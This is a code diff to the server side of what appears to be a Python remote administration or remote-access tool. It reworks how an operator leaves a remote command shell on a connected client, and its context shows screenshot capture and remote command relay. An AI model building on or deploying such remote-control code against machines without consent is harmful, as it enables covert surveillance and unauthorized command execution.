@@ -305,8 +305,10 @@ def screenshot(all_monitors=True):
 def command_shell():
     send(b'cmd')
 
+    receiveOne = decode_utf8(recv(intBuff))
+
     # First Receive: Receive Prompt from the Client
-    strDefault = '\n' + decode_utf8(recv(intBuff)) + '$>> '
+    strDefault = '\n' + receiveOne + '$>> '
     print(strDefault, end='')
 
     # 1. Give Command from user, 2. Send Command to the Client, 3. Receive Command Output from the Client
@@ -316,8 +318,21 @@ def command_shell():
 
         # 2. Send Command to the Client
         # Send 'goback' to the client to close the Command Prompt and Back to the Command Mode(menu)
-        if strCommand == 'quit' or strCommand == 'exit':
-            send(b'goback')
+        # if strCommand == 'quit' or strCommand == 'exit':
+        #     send(b'goback')
+
+        if strCommand == 'goback':
+            send(b'back')
+            receiveTwo = decode_utf8(recv(intBuff))
+
+            if receiveTwo == 'closed':
+                print(fColors.LIGHT_RED + "[-] Command Prompt Closed." + fColors.RESET)
+                return main_menu()
+
+            # strCommand = ''
+            # strDefault = ''
+            # # send_commands()
+            # main_menu()
 
         # we can't use the 'cmd' Command in the Command prompt, so we should check it
         elif strCommand == 'cmd':
@@ -387,12 +402,16 @@ def send_commands():
         # --h, See Commands List Help Menu
         elif strChoice == '--h' or strChoice == 'help':
             commands_help()
-            send_commands()
+            continue
 
         # --x or exit: Command for Close Server, Client and Connection in Command MODE
         elif strChoice == '--x' or strChoice == 'exit':
             close()
-            exit(0)
+            objSocket.close()
+            exit(1)
+
+        elif strChoice == 'goback':
+            return main_menu()
 
 
 
